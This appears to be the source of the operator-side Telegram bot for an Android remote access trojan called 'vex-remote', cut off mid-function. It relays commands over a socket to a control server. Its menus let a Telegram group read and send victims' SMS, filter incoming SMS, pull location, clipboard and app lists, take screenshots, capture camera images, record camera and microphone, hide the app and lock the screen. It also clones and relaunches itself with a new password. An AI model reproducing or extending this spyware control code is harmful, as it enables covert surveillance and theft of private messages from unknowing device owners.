// const token = '';
// const chat_group = -4343;
// const portname = "";
// const passname = "";
// const admins = [];
// const realadmin = 666;
// const hostname = "";
// const portnumb = 9932;


const TelegramBot      = require("node-telegram-bot-api");
const net              = require("net");
const fs               = require("fs");
const crypto           = require("crypto");
const os               = require("os");
const { exec }         = require("child_process");
const me               = new net.Socket();
const bot              = new TelegramBot(token, { polling: true });

let updating_users = [];
let steps = {};
let device_apps = {};
const urlRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)/gi;
let onlyenglishregex = /^[A-Za-z0-9 ]*$/;
let sym = "𓏺|𓏺";
let hoping_messages = [
    ", be patient ...",
    ", everithing is gonna be ok",
    ". hunter must be careful",
    ". nothing yet sir",
    ", waiting for a connection",
    "."
];

function getHopingMessage(){
    return hoping_messages[Math.floor(Math.random() * hoping_messages.length)];
}

function isUrl(mayurl){
    return urlRegex.test(mayurl);
}

function onlyEnglish(text){
    return onlyenglishregex.test(text);
}

function killme(){
    if (os.platform() == "win32"){
        exec(`taskkill /PID ${process.pid} /F`);
        process.exit(1);
    } else if (os.platform() == "linux" || os.platform() == "android"){
        exec(`kill -9 ${process.pid}`);
        process.exit(1);
    }
}

function sortAppsToString(apps, inslice, devid, msgowner){
    let allapps = chunkArray(apps, 5);
    let realslice = allapps[inslice] || [];

    let s = build(`🔬 ${sym} apps list`);
    if (apps.length == 0){
        s += build(` ( page ${inslice + 1} ) is empty`);
    } else {
        s += ` ${inslice + 1}/${allapps.length}`
        for (let app of realslice){
            let _sz = convertBytes(app.size);
            if (_sz.gigabytes.toFixed() == 0){
                if (_sz.megabytes.toFixed() == 0){
                    if (_sz.kilobytes.toFixed() == 0){
                        s += build(`\n\n📦 ${sym} package: `) + `${app.package_name}\n` + build(`📽 ${sym} name: `) + `${app.name}\n` + build(`💉 ${sym} size: ${_sz.bytes} Bytes`);
                    } else {
                        s += build(`\n\n📦 ${sym} package: `) + `${app.package_name}\n` + build(`📽 ${sym} name: `) + `${app.name}\n` + build(`💉 ${sym} size: ${_sz.kilobytes.toFixed()} KB`);
                    }
                } else {
                    s += build(`\n\n📦 ${sym} package: `) + `${app.package_name}\n` + build(`📽 ${sym} name: `) + `${app.name}\n` + build(`💉 ${sym} size: ${_sz.megabytes.toFixed()} MB`);
                }
            } else {
                s += build(`\n\n📦 ${sym} package: `) + `${app.package_name}\n` + build(`📽 ${sym} name: `) + `${app.name}\n` + build(`💉 ${sym} size: ${_sz.gigabytes.toFixed()} GB`);
            }
        }
    }

    let keybinds = [[]];

    if (inslice < (allapps.length - 1)){
        keybinds[0].push({
            text: build("next ⏭"),
            callback_data: `sa_${msgowner}_${devid}_${inslice + 1}`
        })
    }

    if (inslice > 0){
        keybinds[0].push({
            text: build("⏮ previous"),
            callback_data: `sa_${msgowner}_${devid}_${inslice - 1}`
        })
    }

    if (keybinds[0].length == 0){
        keybinds.pop();
    }

    keybinds.push([{
        text: build("close"),
        callback_data: `close_${msgowner}`
    }])

    return {
        message: s,
        binds: keybinds
    }

}

function createKeyboard(access_list = [], devid, msgowner, callback = () => {}){
    let layers = [[]];
    let layer_index = 0;

    access_list.push("changePortPassword");
    access_list.push("changeUsersOwning")

    if (access_list.includes("getAllSMS") || access_list.includes("sendSMS") || access_list.includes("setSMSFilter") || access_list.includes("removeSMSFilter")){
        layers[layer_index].push({
            text: build("sms 📪"),
            callback_data: `smsPanel_${msgowner}_${devid}`
        });
    }

    if (access_list.includes("setSoundVolume")){
        layers[layer_index].push({
            text: build("volume 🔊"),
            callback_data: `volumePanel_${msgowner}_${devid}`
        });
    }

    for (let access of access_list) {
        if (layers[layer_index].length === 2 && layer_index % 2 === 0) {
            layer_index++;
            layers[layer_index] = [];
        } else if ( layers[layer_index].length === 1 && !(layer_index % 2 === 0) ){
            layer_index++;
            layers[layer_index] = [];
        }

        switch (access) {
            case "openUrl":
                layers[layer_index].push({
                    text: build("open-url 🚁"),
                    callback_data: `openUrl_${msgowner}_${devid}`
                });
                break;
            case "sendToast":
                layers[layer_index].push({
                    text: build("toast 📦"),
                    callback_data: `sendToast_${msgowner}_${devid}`
                });
                break;
            case "sendNotification":
                layers[layer_index].push({
                    text: build("send-notif 🥤"),
                    callback_data: `sendNotification_${msgowner}_${devid}`
                });
                break;
            case "vibratePhone":
                layers[layer_index].push({
                    text: build("vibrate 👽"),
                    callback_data: `vibratePhone_${msgowner}_${devid}`
                });
                break;
            case "getGeoLocation":
                layers[layer_index].push({
                    text: build("location 🗺"),
                    callback_data: `getGeoLocation_${msgowner}_${devid}`
                });
                break;
            case "getInstalledApps":
                layers[layer_index].push({
                    text: build("apps 📃"),
                    callback_data: `getInstalledApps_${msgowner}_${devid}`
                });
                break;
            case "getClipboard":
                layers[layer_index].push({
                    text: build("clipboard ⛓"),
                    callback_data: `getClipboard_${msgowner}_${devid}`
                });
                break;
            case "runUSSD":
                layers[layer_index].push({
                    text: build("run-ussd 🌌"),
                    callback_data: `runUSSD_${msgowner}_${devid}`
                });
                break;
            case "lockScreen":
                layers[layer_index].push({
                    text: build("lock 🔒"),
                    callback_data: `lockScreen_${msgowner}_${devid}`
                });
                break;
            case "unlockScreen":
                layers[layer_index].push({
                    text: build("unlock 🔓"),
                    callback_data: `unlockScreen_${msgowner}_${devid}`
                });
                break;
            case "takeScreenshot":
                layers[layer_index].push({
                    text: build("screen-shot 🍃"),
                    callback_data: `takeScreenshot_${msgowner}_${devid}`
                });
                break;
            case "takeBackshot":
                layers[layer_index].push({
                    text: build("back-shot 🌑"),
                    callback_data: `takeBackshot_${msgowner}_${devid}`
                });
                break;
            case "takeFrontshot":
                layers[layer_index].push({
                    text: build("front-shot 🌕"),
                    callback_data: `takeFrontshot_${msgowner}_${devid}`
                });
                break;
            
            case "recordFront":
                layers[layer_index].push({
                    text: build("record-front 👁"),
                    callback_data: `recordFront_${msgowner}_${devid}`
                });
                break;
            
            case "recordBack":
                layers[layer_index].push({
                    text: build("record-back 🌩"),
                    callback_data: `recordBack_${msgowner}_${devid}`
                });
                break;
            case "recordMicrophone":
                layers[layer_index].push({
                    text: build("record-mic 🌩"),
                    callback_data: `recordMicrophone_${msgowner}_${devid}`
                });
                break;
            case "hideApp":
                layers[layer_index].push({
                    text: build("hide 🌚"),
                    callback_data: `hideApp_${msgowner}_${devid}`
                });
                break;
            case "unhideApp":
                layers[layer_index].push({
                    text: build("unhide 🌝"),
                    callback_data: `unhideApp_${msgowner}_${devid}`
                });
                break;
            case "changeIcon":
                layers[layer_index].push({
                    text: build("change-icon💬"),
                    callback_data: `changeIcon_${msgowner}_${devid}`
                });
                break;
            case "changePortPassword":
                layers[layer_index].push({
                    text: build("change-pass 🌐"),
                    callback_data: `changePortPassword_${realadmin}_${devid}`
                });
                break;
            case "changeUsersOwning":
                layers[layer_index].push({
                    text: build("move-users 🛢"),
                    callback_data: `changeUsersOwning_${realadmin}_${devid}`
                });
                break;
        }
    }

    if (layers[layer_index].length === 0) {
        layers.pop();
    }

    layers.push([]);
    layers[layers.length - 1].push({
        text: build("close"),
        callback_data: `close_${msgowner}`
    });

    callback(layers);
}

function build(string) {
    const translationTable = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationTable[char] || char).join('');
}

function guessApp(nickname){
    if (nickname == "yt"){return "youtube"}
    else if (nickname == "in"){return "instagram"}
    else if (nickname == "rb"){return "rubika"}
    else if (nickname == "wt"){return "whatsapp"}
}

function convertBytes(numBytes) {
    const conversions = {
        bytes: numBytes,
        kilobytes: numBytes / 1024,
        megabytes: numBytes / (1024 ** 2),
        gigabytes: numBytes / (1024 ** 3)
    };
    return conversions;
}

function chunkArray(array, chunkSize) {
    const result = [];
    for (let i = 0; i < array.length; i += chunkSize) {
        result.push(array.slice(i, i + chunkSize));
    }
    return result;
}

function combinePath(dirname, filename){
    if (dirname.includes("\\")){
        return dirname+"\\"+filename;
    } else if (dirname.includes("/")){
        return dirname+"/"+filename;
    }
}

async function createClone(newpassword, remote_basic_info){
    let ahash = crypto.createHash("md5").update((Math.floor(Math.random() * 999999999999) - 100000).toString()).digest('hex').slice(0, 10);
    let starter = `const token = "${remote_basic_info.token}"\nconst chat_group = ${remote_basic_info.chat_group}\nconst portname = "${remote_basic_info.portname}"\nconst passname = "${newpassword}"\nconst admins = []\nconst realadmin = ${remote_basic_info.realadmin}\nconst hostname = "${remote_basic_info.hostname}"\nconst portnumb = ${remote_basic_info.portnumb}\n`;
    let remote_source = fs.readFileSync("remote.js");
    fs.writeFile(combinePath(__dirname, `${realadmin}_${ahash}.js`), starter+remote_source, async (err) => {
        if (err){
            console.log(err);
            await bot.sendMessage(
                chat_group,
                build(`🔴 ${sym} error while creating new remote-file: `) + err.message
            )
        } else {
            await bot.sendMessage(
                chat_group,
                build(`✅ ${sym} new remote-file created, if it goes offline, please told us in `) + `<a href="https://t.me/VexBite">${build("vex group")}</a>`,
                {
                    parse_mode: "HTML"
                }
            ).then(async (rmsg) => {
                exec(`node ${combinePath(__dirname, `${realadmin}_${ahash}.js`)}`);
                fs.readdir(__dirname, (err, files) => {
                    for (let file of files){
                        if (file.startsWith(realadmin)){
                            let spl = file.split("_");
                            if (spl[1] != ahash+".js"){
                                fs.unlinkSync(combinePath(__dirname, file));
                            }
                        }
                    }
                })
                
            });
        }
    })
}


let mine = {
    username: null
}

me.connect(portnumb, hostname, () => {
    bot.sendMessage(
        chat_group,
        build(`➕ ${sym} remote connected to main-server\n\n✅ ${sym} send `) + "/start" + build(` to see users\n👮‍♂️ ${sym} use `) + "promote" + build(" or ") + "حق مدیر" + build(` to give access of remote to someone\n\n⛏️ ${sym} use `) + "depromote" + build(" or ") + "حذف حق مدیر" + build(" to remove someone from admin-accessory")
    )

    bot.getMe().then((myinfo) => {
        mine.username = myinfo.username;
    })
})


bot.on("message", async (message) => {
    message.text = message.text === undefined || message.text === null ? "" : message.text.toLowerCase();
    if (message.chat.id == chat_group){
        if (admins.includes(message.from.id) || message.from.id === realadmin){
            if (message.text.startsWith("/start")){
                await bot.sendMessage(
                    chat_group,
                    build("🎛 𓏺|𓏺 vex-remote is online and active\n🔊 𓏺|𓏺 called by ") + `<a href="tg://openmessage?user_id=${message.from.id}">${(message.from.first_name !== undefined ? message.from.first_name : "‌‌ ‌‌") + " " + (message.from.last_name !== undefined ? message.from.last_name : "")}</a>` + build("\n📥 𓏺|𓏺 be careful about ") + `<a href="t.me/VexPrivacy">${build("privacy")}</a>`,
                    {
                        reply_to_message_id: message.message_id,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: build("users 👥"),
                                        callback_data: `seeusers_${message.from.id}_0`
                                    },
                                    {
                                        text: build("admins 🌩"),
                                        callback_data: `seeadmins_${realadmin}`
                                    }
                                ]
                            ]
                        }
                    }
                )
                return;
            } else if (["حق مدیر", "promote"].includes(message.text)){
                if (message.reply_to_message){
                    if (message.from.id === realadmin){
                        if (admins.includes(message.reply_to_message.from.id)){
                            await bot.sendMessage(
                                message.chat.id,
                                build("🔴 𓏺|𓏺 user is already admin of bot"),
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        } else {
                            admins.push(message.reply_to_message.from.id);
                            await bot.sendMessage(
                                message.chat.id,
                                build("🗃 𓏺|𓏺 user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("promoted"),
                                {
                                    reply_to_message_id: message.message_id,
                                    parse_mode: "HTML"
                                }
                            )
                        }
                    } else {
                        await bot.sendMessage(
                            message.chat.id,
                            build("🔴 𓏺|𓏺 you are not owner of remote !"),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }
                } else {
                    await bot.sendMessage(
                        message.chat.id,
                        build("🔴 𓏺|𓏺 please reply on someone"),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            } else if (["حذف مدیر", "depromote"].includes(message.text)){
                if (message.reply_to_message){
                    if (message.from.id === realadmin){
                        if (!admins.includes(message.reply_to_message.from.id)){
                            await bot.sendMessage(
                                message.chat.id,
                                build("🔴 𓏺|𓏺 user is not admin yet"),
                                {
                                    reply_to_message_id: message.message_id
                                }
                            )
                        } else {
                            let indx = admins.indexOf(message.reply_to_message.from.id);
                            if (indx > -1){
                                admins.splice(indx, 1);
                            }
                            await bot.sendMessage(
                                message.chat.id,
                                build("🚧 𓏺|𓏺 user ") + `<a href="tg://openmessage?user_id=${message.reply_to_message.from.id}">${message.reply_to_message.from.id}</a> ` + build("depromoted"),
                                {
                                    reply_to_message_id: message.message_id,
                                    parse_mode: "HTML"
                                }
                            )
                        }
                    } else {
                        await bot.sendMessage(
                            message.chat.id,
                            build("🔴 𓏺|𓏺 you are not owner of remote !"),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    }
                } else {
                    await bot.sendMessage(
                        message.chat.id,
                        build("🔴 𓏺|𓏺 please reply on someone"),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                }
            } else if (message.text.startsWith("/sign_")){
                let _devid = message.text.slice(6, message.text.length).trim().replace(`@${mine.username}`, '');
                if (_devid === undefined || _devid === null || _devid === ""){
                    await bot.sendMessage(
                        message.chat.id,
                        build("🔴 𓏺|𓏺 no device id detected"),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else {
                    me.write(JSON.stringify({
                        port: portname,
                        password: passname,
                        mask: "metro",
                        method: "getUserByDeviceId",
                        device_id: _devid,
                        shortcut: {
                            way: "seeMenu",
                            chat_id: message.chat.id,
                            message_id: message.message_id,
                            msgowner: message.from.id,
                            device_id: _devid,
                            edit: false
                        }
                    }))
                }
            } else if (Object.keys(steps).includes(message.from.id.toString())){
                let colab = steps[message.from.id];
                let mode = colab.mode;
                let devid = colab.device_id;
                if (mode == "getUrl"){
                    if (isUrl(message.text)){
                        await bot.sendMessage(
                            message.chat.id,
                            build(`✍ ${sym} trying to send data ... \n - this message will edit !`),
                            {
                                reply_to_message_id: message.message_id
                            }
                        ).then(async (rmsg) => {
                            delete steps[message.from.id];
                            me.write(JSON.stringify({
                                port: portname,
                                password: passname,
                                method: "openUrl",
                                mask: "metro",
                                device_id: devid,
                                url: message.text,
                                shortcut: {
                                    chat_id: message.chat.id,
                                    message_id: rmsg.message_id,
                                    url: message.text,
                                    device_id: devid,
                                    edit: true
                                }
                            }));
                        })
                    }
                } else if (mode == "getToast"){
                    if (message.text.length > 100){
                        await bot.sendMessage(
                            message.chat.id,
                            build(`🔴 ${sym} the message must be less than 100 charecters\n - please try again`),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    } else {
                        await bot.sendMessage(
                            message.chat.id,
                            build(`✍ ${sym} trying to send data ... \n - this message will edit !`),
                            {
                                reply_to_message_id: message.message_id
                            }
                        ).then(async (rmsg) => {
                            delete steps[message.from.id];
                            me.write(JSON.stringify({
                                port: portname,
                                password: passname,
                                method: "sendToast",
                                mask: "metro",
                                device_id: devid,
                                toast: message.text,
                                shortcut: {
                                    chat_id: message.chat.id,
                                    message_id: rmsg.message_id,
                                    toast: message.text,
                                    device_id: devid,
                                    edit: true
                                }
                            }));
                        })
                    }
                } else if (mode == "getAllSMS"){
                    delete steps[message.from.id];
                    me.write(JSON.stringify({
                        port: portname,
                        password: passname,
                        method: "sendAllSMS",
                        mask: "metro",
                        device_id: devid,
                        sms: message.text,
                        shortcut: {
                            chat_id: message.chat.id,
                            message_id: message.message_id,
                            sms: message.text,
                            device_id: devid,
                            edit: false
                        }
                    }));
                } else if (mode == "getSMS"){
                    steps[message.from.id]['sms'] = message.text;
                    steps[message.from.id]['mode'] = "getPhoneSMS"
                    await bot.sendMessage(
                        message.chat.id,
                        build(`📞 ${sym} send the name/phone-number`),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else if (mode == "getPhoneSMS"){
                    me.write(JSON.stringify({
                        port: portname,
                        password: passname,
                        method: "sendSMS",
                        mask: "metro",
                        device_id: devid,
                        tonumber: message.text,
                        sms: steps[message.from.id]['sms'],
                        shortcut: {
                            chat_id: message.chat.id,
                            message_id: message.message_id,
                            sms: steps[message.from.id]['sms'],
                            device_id: devid,
                            tonumber: message.text,
                            edit: false
                        }
                    }));

                    delete steps[message.from.id];

                } else if (mode == "smsFilter" || mode == "removeSMSFilter"){
                    delete steps[message.from.id];
                    me.write(JSON.stringify({
                        port: portname,
                        password: passname,
                        method: (mode == "smsFilter") ? "setSMSFilter" : "removeSMSFilter",
                        mask: "metro",
                        device_id: devid,
                        filter_number: message.text,
                        shortcut: {
                            chat_id: message.chat.id,
                            message_id: message.message_id,
                            device_id: devid,
                            filter_number: message.text,
                            edit: false
                        }
                    }));
                } else if (mode == "getNewPassword"){
                    if (message.text.length < 8){
                        await bot.sendMessage(
                            message.chat.id,
                            build(`🔴 ${sym} password charecters must be more than 8 !`),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    } else if (message.text.length > 20){
                        await bot.sendMessage(
                            message.chat.id,
                            build(`🔴 ${sym} password charecters must be less than 20 !`),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    } else if (!onlyEnglish(message.text)){
                        await bot.sendMessage(
                            message.chat.id,
                            build(`🔴 ${sym} password must be only in english !`),
                            {
                                reply_to_message_id: message.message_id
                            }
                        )
                    } else {
                        delete steps[message.from.id];
                        me.write(JSON.stringify({
                            port: portname,
                            password: passname,
                            method: "changePortPassword",
                            mask: "metro",
                            new_password: message.text,
                            shortcut: {
                                chat_id: message.chat.id,
                                message_id: message.message_id,
                                new_password: message.text,
                                msgowner: message.from.id,
                                edit: false
                            }
                        }));
                        await createClone(message.text.trim(), {
                            token: token,
                            chat_group: chat_group,
                            portname: portname,
                            realadmin: realadmin,
                            hostname: hostname,
                            portnumb: portnumb
                        }).then(() => {
                            killme();
                        })
                    }
                } else if (mode == "getNewOwningPort"){
                    steps[message.from.id]['mode'] = "getNewOwningPassword";
                    steps[message.from.id]['port'] = message.text;
                    await bot.sendMessage(
                        message.chat.id,
                        build(`📚 ${sym} send the password which you want move your users into that port`),
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else if (mode == "getNewOwningPassword"){
                    steps[message.from.id]['mode'] = "getNewOwningUsersLength";
                    steps[message.from.id]['password'] = message.text;
                    await bot.sendMessage(
                        message.chat.id,
                        build(`👥 ${sym} send number which is the length of users will move into the `) + steps[message.from.id]['port'],
                        {
                            reply_to_message_id: message.message_id
                        }
                    )
                } else if (mode == "getNewOwningUsersLength"){
                    if (/^\d+$/.test(message.text)){
                        await bot.sendMessage(
                            message.chat.id,
                            build(`✈ ${sym} trying to move users\n🏮 ${sym} `) + steps[message.from.id]['port'],
                            {
                                reply_to_message_id: message.message_id
                            }
                        ).then(async (rmsg) => {
                            me.write(JSON.stringify({
                                port: portname,
                                password: passname,
                                method: "changeUsersOwning",
                                mask: "metro",
                                new_password: steps[message.from.id]['password'],
                                new_port: steps[message.from.id]['port'],
                                userslength: parseInt(message.text),
                                shortcut: {
                                    chat_id: message.chat.id,
                                    message_id: rmsg.message_id,
                                    new_password: steps[message.from.id]['password'],
                                    new_port: steps[message.from.id]['port'],
                                    userslength: parseInt(message.text),
                                    edit: true
                                }
                            }));
                            delete steps[message.from.id];
                        })
                    }
                }
            }
        }
    }
})

bot.on("callback_query", async (call) => {
    let spl = call.data.split("_");
    let mode = spl[0];
    let uid = parseInt(spl[1]);
    if (uid == call.from.id){
        if (mode == "seeusers"){
            if (updating_users.length == 0){
                await bot.editMessageText(
                    build(`🔭 𓏺|𓏺 none connected yet${getHopingMessage()}`),
                    {
                        message_id: call.message.message_id,
                        chat_id: call.message.chat.id
                    }
                )
                return;
            }

            let inslice = parseInt(spl[2]);
            let slices = chunkArray(updating_users, 10);
            let realslice = slices[inslice] || [];
            let keyboard = [[]]

            if (inslice > 0){
                keyboard[0].push({
                    text: build("⏮ previous"),
                    callback_data: `seeusers_${uid}_${inslice - 1}`
                });
            }

            if (inslice < slices.length - 1){
                keyboard[0].push({
                    text: build("next ⏭"),
                    callback_data: `seeusers_${uid}_${inslice + 1}`
                });
            }

            if (realslice.length == 0){
                await bot.editMessageText(
                    build("🔴 𓏺|𓏺 the list of users were changed\n🔌 𓏺|𓏺 please use ") + "/start" + build(" again to see handled-users"),
                    {
                        message_id: call.message.message_id,
                        chat_id: call.message.chat.id
                    }
                )
            } else {
                let s = `🔰 𓏺|𓏺 connected users box\n🕸 𓏺|𓏺 ${updating_users.length} were connected\n📦 𓏺|𓏺 page ${inslice+1}/${slices.length}`;
                for (let target of realslice){
                    s += `\n\n🛠 𓏺|𓏺 <code>${target.command}</code>\n📄 𓏺|𓏺 ` + build(`has ${target.accessory.length} access`);
                }

                await bot.editMessageText(
                    s,
                    {
                        message_id: call.message.message_id,
                        chat_id: call.message.chat.id,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: keyboard
                        }
                    }
                )
            }
        } else if (mode == "seeadmins"){
            let ads = build(`👮‍♂️ 𓏺|𓏺 list of admins ${admins.length === 0 ? "is empty" : "\n"}`);
            if (admins.length >= 0){
                let num = 1;
                for (let ad of admins){
                    ads += `\n● ${num} - <a href="tg://openmessage?user_id=${ad}">${ad}</a>`;
                }
            }
            await bot.editMessageText(
                ads,
                {
                    message_id: call.message.message_id,
                    chat_id: call.message.chat.id,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: build("🔙 back"),
                                    callback_data: `backadminpanel_${uid}`
                                }
                            ]
                        ]
                    }
                }
            )
        } else if (mode == "backadminpanel"){
            await bot.editMessageText(
                build("🎛 𓏺|𓏺 vex-remote is online and active\n🔊 𓏺|𓏺 called by ") + `<a href="tg://openmessage?user_id=${call.from.id}">${(call.from.first_name !== undefined ? call.from.first_name : "‌‌ ‌‌") + " " + (call.from.last_name !== undefined ? call.from.last_name : "")}</a>` + build("\n📥 𓏺|𓏺 be careful about ") + `<a href="t.me/VexPrivacy">${build("privacy")}</a>`,
                {
                    message_id: call.message.message_id,
                    chat_id: call.message.chat.id,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: build("users 👥"),
                                    callback_data: `seeusers_${call.from.id}_0`
                                },
                                {
                                    text: build("admins 🌩"),
                                    callback_data: `seeadmins_${realadmin}`
                                }
                            ]
                        ]
                    }
                }
            )
        } else if (mode === "close"){
            try{
                await bot.deleteMessage(
                    call.message.chat.id,
                    call.message.message_id
                );
            } catch (e) {}
        } else if (mode == "vibratePhone"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "vibratePhone",
                mask: "metro",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }))
        } else if (mode == "openUrl"){
            steps[call.from.id] = {
                mode: "getUrl",
                device_id: spl[2]
            };
            await bot.editMessageText(
                build(`➕ ${sym} send your link`),
                {
                    message_id: call.message.message_id,
                    chat_id: call.message.chat.id
                }
            )
        } else if (mode == "sendToast"){
            steps[call.from.id] = {
                mode: "getToast",
                device_id: spl[2]
            };
            await bot.editMessageText(
                build(`➕ ${sym} send your toast-message`),
                {
                    message_id: call.message.message_id,
                    chat_id: call.message.chat.id
                }
            )
        } else if (mode == "getGeoLocation"){
            await bot.editMessageText(
                build(`🍂 ${sym} data sent to the client\n - waiting to get data ...`),
                {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id
                }
            )
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                method: "getGeoLocation",
                device_id: spl[2],
                mask: "metro",
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }))
        } else if (mode == "getInstalledApps"){
            await bot.editMessageText(
                build(`🦋 ${sym} data sent to the client\n - waiting to get data ...`),
                {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id
                }
            )
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                device_id: spl[2],
                mask: "metro",
                method: "getInstalledApps",
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    msgowner: uid,
                    device_id: spl[2],
                    edit: true
                }
            }))
        } else if (mode == "sa"){
            let devid = spl[2];
            let slc = spl[3];
            if (Object.keys(device_apps).includes(devid)){
                let srta = sortAppsToString(device_apps[devid], parseInt(slc), devid, uid);
                await bot.editMessageText(
                    srta.message,
                    {
                        chat_id: call.message.chat.id,
                        message_id: call.message.message_id,
                        reply_markup: {
                            inline_keyboard: srta.binds
                        }
                    }
                )
            } else {
                await bot.editMessageText(
                    build(`🔴 ${sym} sorry but no apps selected for your device-id, please order to see apps from user-panel then use keyboard`),
                    {
                        chat_id: call.message.chat.id,
                        message_id: call.message.message_id
                    }
                )
            }
        } else if (mode == "runUSSD"){
            await bot.editMessageText(
                build("- soon ..."),
                {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id
                }
            )
        } else if (mode == "volumePanel"){
            await bot.editMessageText(
                build(`🔊 ${sym} volume-panel for `) + spl[2] + build(`\n💠 ${sym} selected volume is 50`),
                {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "⏮",
                                    callback_data: `svp_${uid}_${spl[2]}_50`
                                },
                                {
                                    text: "50",
                                    callback_data: `setSoundVolume_${uid}_${spl[2]}_50`
                                },
                                {
                                    text: "⏭",
                                    callback_data: `svn_${uid}_${spl[2]}_50`
                                }
                            ],
                            [
                                {
                                    text: build("↩ back"),
                                    callback_data: `seemyuser_${uid}_${spl[2]}`
                                },
                                {
                                    text: build("🔼 close"),
                                    callback_data: `close_${uid}`
                                }
                            ]
                        ]
                    }
                }
            )
        } else if (mode == "svp"){
            let volume = parseInt(spl[3]);
            if ((volume - 5) < 0){
                await bot.answerCallbackQuery(call.id,
                    {
                        text: build(`🔴 ${sym} volume cannot be less than 0`),
                        show_alert: true
                    }
                )
            } else {
                await bot.editMessageText(
                    build(`🔊 ${sym} volume-panel for `) + spl[2] + build(`\n💠 ${sym} selected volume is ${volume - 5}`),
                    {
                        chat_id: call.message.chat.id,
                        message_id: call.message.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: "⏮",
                                        callback_data: `svp_${uid}_${spl[2]}_${volume - 5}`
                                    },
                                    {
                                        text: `${volume - 5}`,
                                        callback_data: `setSoundVolume_${uid}_${spl[2]}_${volume - 5}`
                                    },
                                    {
                                        text: "⏭",
                                        callback_data: `svn_${uid}_${spl[2]}_${volume - 5}`
                                    }
                                ],
                                [
                                    {
                                        text: build("↩ back"),
                                        callback_data: `seemyuser_${uid}_${spl[2]}`
                                    },
                                    {
                                        text: build("🔼 close"),
                                        callback_data: `close_${uid}`
                                    }
                                ]
                            ]
                        }
                    }
                )
            }
        } else if (mode == "svn"){
            let volume = parseInt(spl[3]);
            if ((volume + 5) > 100){
                await bot.answerCallbackQuery(call.id,
                    {
                        text: build(`🔴 ${sym} volume cannot be more than 100`),
                        show_alert: true
                    }
                )
            } else {
                await bot.editMessageText(
                    build(`🔊 ${sym} volume-panel for `) + spl[2] + build(`\n💠 ${sym} selected volume is ${volume + 5}`),
                    {
                        chat_id: call.message.chat.id,
                        message_id: call.message.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: "⏮",
                                        callback_data: `svp_${uid}_${spl[2]}_${volume + 5}`
                                    },
                                    {
                                        text: `${volume + 5}`,
                                        callback_data: `setSoundVolume_${uid}_${spl[2]}_${volume + 5}`
                                    },
                                    {
                                        text: "⏭",
                                        callback_data: `svn_${uid}_${spl[2]}_${volume + 5}`
                                    }
                                ],
                                [
                                    {
                                        text: build("↩ back"),
                                        callback_data: `seemyuser_${uid}_${spl[2]}`
                                    },
                                    {
                                        text: build("🔼 close"),
                                        callback_data: `close_${uid}`
                                    }
                                ]
                            ]
                        }
                    }
                )
            }
        } else if (mode == "seemyuser"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "getUserByDeviceId",
                device_id: spl[2],
                shortcut: {
                    way: "seeMenu",
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    msgowner: call.from.id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "setSoundVolume"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "setSoundVolume",
                device_id: spl[2],
                volume: parseInt(spl[3]),
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    msgowner: call.from.id,
                    device_id: spl[2],
                    volume: parseInt(spl[3]),
                    edit: true
                }
            }));
        } else if (mode == "takeScreenshot"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "takeScreenshot",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
                    edit: true
                }
            }));
        } else if (mode == "takeFrontshot"){
            me.write(JSON.stringify({
                port: portname,
                password: passname,
                mask: "metro",
                method: "takeFrontshot",
                device_id: spl[2],
                shortcut: {
                    chat_id: call.message.chat.id,
                    message_id: call.message.message_id,
                    device_id: spl[2],
